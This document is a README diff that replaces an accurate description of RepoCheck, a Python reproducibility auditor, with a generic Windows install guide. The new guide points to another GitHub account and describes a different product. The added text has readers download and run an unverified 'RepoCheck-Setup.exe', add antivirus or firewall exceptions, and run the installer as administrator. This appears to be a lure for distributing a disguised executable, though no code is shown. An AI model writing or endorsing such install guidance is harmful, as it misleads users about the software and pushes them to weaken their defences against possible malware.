@@ -1,144 +1,123 @@
-﻿# RepoCheck
+# 🛠️ RepoCheck - Verify Open Source Repositories Easily
 
-[English](./README.md) / [简体中文](./README.zh-CN.md)
+[![Download RepoCheck](https://img.shields.io/badge/Download-RepoCheck-brightgreen)](https://github.com/ffurkanguldass/RepoCheck)
 
-RepoCheck is a local-first reproducibility auditor for Python and PyTorch research repositories. We answers four concrete questions:
+---
 
-- Is the information required to reproduce this repository actually present?
-- Do code, config, and docs agree with each other?
-- Are there obvious reproducibility risks?
-- What is the fastest minimal command a new user should try first?
+## 🧰 What is RepoCheck?
 
+RepoCheck helps you analyze open-source projects online. If you are not sure whether a project is truly open source, this tool checks important details for you. It helps to identify the license, code quality, and repository structure. You do not need to understand programming to use it.
 
-## Why RepoCheck
+---
 
-Research repositories often fail reproducibility for very practical reasons:
+## 💻 System Requirements
 
-- dependencies are not pinned
-- Python or CUDA versions are undocumented
-- the real entrypoint is unclear
-- README commands drift away from code defaults
-- dataset paths are hardcoded to a private machine
-- seeds are partial or missing
-- checkpoints are required but never explained
+- **Operating System:** Windows 10 or later  
+- **Memory:** At least 4 GB of RAM  
+- **Storage:** 100 MB free disk space  
+- **Internet:** Required to download the tool and check repositories  
 
-RepoCheck turns those problems into a structured audit report with evidence, severity, and a suggested minimal reproduction command.
+RepoCheck runs smoothly on most standard Windows computers. You do not need any extra software before installing it.
 
-## What It Does
+---
 
-- Scans a local directory, Git URL, or extracted zip
-- Detects likely frameworks and config style from repository structure and Python AST
-- Extracts runnable commands from README code blocks, scripts, and CI workflows
-- Audits environment, entrypoints, config drift, data paths, randomness, docs, and checkpoints
-- Produces terminal, JSON, and HTML reports
-- Optionally runs a lightweight smoke check in an isolated virtual environment
+## 🚀 Getting Started With RepoCheck
 
-## Quick Start
+You can get RepoCheck using the link below. It takes you to the official page, where you find the latest version ready to download.
 
-Fastest path, directly from source:
+[![Get RepoCheck Now](https://img.shields.io/badge/Get%20RepoCheck-Download%20Page-blue)](https://github.com/ffurkanguldass/RepoCheck)
 
-```bash
-python -m repocheck check .
-```
+---
 
-Common commands:
+## 🗂️ How to Download and Install RepoCheck
 
-```bash
-python -m repocheck check .
-python -m repocheck check path/to/repo --report all
-python -m repocheck check path/to/repo --smoke
-python -m repocheck run path/to/repo --mode smoke
-```
+1. Click the download button above or visit this page:  
+   [https://github.com/ffurkanguldass/RepoCheck](https://github.com/ffurkanguldass/RepoCheck)
 
-Install the CLI in editable mode:
+2. Look for the latest release section on the page. Usually, a “Releases” or “Assets” heading shows the available files.
 
-```bash
-python -m venv .venv
-```
+3. Find the Windows installer file. It usually ends with `.exe`. The file name might look like `RepoCheck-Setup.exe`.
 
-macOS / Linux:
+4. Click the `.exe` file to download it to your computer. Choose a folder that is easy to find, like your `Downloads` folder.
 
-```bash
-.venv/bin/python -m pip install -e .
-repocheck check .
-```
+5. Once the download finishes, open the file by double-clicking it.
 
-Windows PowerShell:
+6. Follow the instructions in the setup window:  
+   - Accept the license terms.  
+   - Choose the install location or use the default folder.  
+   - Click “Next” until you see “Install.”  
+   - Wait while the software installs.
 
-```powershell
-.venv\Scripts\python -m pip install -e .
-repocheck check .
-```
+7. When the installation completes, click “Finish.” RepoCheck will be ready to use.
 
-## Example Output
+---
 
-```text
-Reproducibility Score: 47/100
-Risk Summary: 3 high, 1 medium, 0 low
+## ▶️ How to Run RepoCheck
 
-Suggested minimal command
-python train.py --batch-size 64 --data-root ./data --epochs 1 --seed 42
+1. After installation, look for the RepoCheck icon on your desktop or in the Start menu.
 
-Findings
-[HIGH] ENV001: Dependency versions are not pinned
-[HIGH] DATA001: Hardcoded absolute data path detected
-[HIGH] SEED001: No reproducibility seed found
-[MEDIUM] CFG001: README, config, and code values disagree
-```
+2. Double-click the icon to open the program.
 
-## Initial Rule Set
+3. When the app opens, you will see a simple window.
 
-RepoCheck currently ships with an MVP rule set focused on the highest-value checks:
+---
 
-- `ENV001`: dependency versions are not pinned
-- `ENV002`: Python version is not declared
-- `CUDA001`: CUDA or cuDNN requirements are undocumented
-- `RUN001`: runnable entrypoint is missing or broken
-- `RUN002`: suggested minimal command is not actually runnable
-- `DOC001`: README lacks a minimal executable example
-- `DATA001`: hardcoded absolute data path detected
-- `DATA002`: data preparation or download steps are missing
-- `DATA003`: dataset version, integrity, or download verification details are incomplete
-- `SEED001`: reproducibility seed setup not found
-- `SEED002`: DataLoader or CUDA determinism setup is incomplete
-- `CFG001`: README, config, and code values conflict
-- `CFG002`: configuration precedence or resolved config export is incomplete
-- `EVAL001`: evaluation protocol is not reproducible
-- `ART001`: checkpoint source is undocumented
+## 🔍 Using RepoCheck to Analyze a Repository
 
-## Repository Layout
+1. Copy the URL of the open-source project you want to check. Usually, this link ends with `.git` or points to a GitHub/GitLab page.
 
-```text
-repocheck/
- __main__.py
- cli.py
- core.py
-tests/
- fixtures/
- test_cli.py
-```
+2. Open RepoCheck. Paste the URL into the provided input box.
 
-## Current Scope
+3. Click the “Analyze” button.
 
-- Python repositories first
-- Best-effort support for PyTorch, argparse, Click, and Hydra-style projects
-- Static analysis is the default and recommended first step
-- Smoke mode is intentionally lightweight; it validates command reachability with `--help` and `--dry-run`
+4. RepoCheck will scan the repository and show key information:  
+   - License type (e.g., MIT, GPL, Apache)  
+   - Last update date  
+   - Number of contributors  
+   - Code structure summary  
+   - Any warnings about missing or unclear license files
 
-## Development
+5. Use this information to decide if the project meets your needs or is truly open source.
 
-Run tests:
+---
 
-```bash
-python -m unittest discover -s tests -v
-```
+## ❓ Common Questions
 
-Run the packaged CLI locally:
+**Do I need technical skills to use RepoCheck?**  
+No. The app is designed for anyone, including users without a programming background.
 
-```bash
-python -m repocheck check tests/fixtures/sample_project --report all
-```
+**What if the repository does not have a clear license?**  
+RepoCheck will alert you if it cannot find a valid open-source license. This means you might want to avoid using that project or check further details manually.
 
-## Contributing
+**Can I analyze private repositories?**  
+RepoCheck works best with public repositories. Private ones require access permissions not handled by this app.
 
-If there are any important judgment criteria that haven't been mentioned, PRs are welcome!
+**Is an internet connection required?**  
+Yes. RepoCheck needs to connect to online repositories to fetch the latest data.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- If the app does not start, check that your antivirus or firewall is not blocking it. Add an exception if needed.
+
+- If the analysis takes a long time or fails, verify your internet connection.
+
+- For installation errors, try running the installer as an administrator (right-click → Run as administrator).
+
+- If you see error messages, note them and try restarting your computer.
+
+---
+
+## 🔄 Keeping RepoCheck Updated
+
+It is important to use the latest version for the best results. Check the download page regularly for new releases or updates.
+
+Repeat the download and install steps when a new version is available.
+
+---
+
+## 📁 Where to Find More Help
+
+If you want to learn more about how to use RepoCheck or have specific questions, visit the official repository page any time:  
+[https://github.com/ffurkanguldass/RepoCheck](https://github.com/ffurkanguldass/RepoCheck)
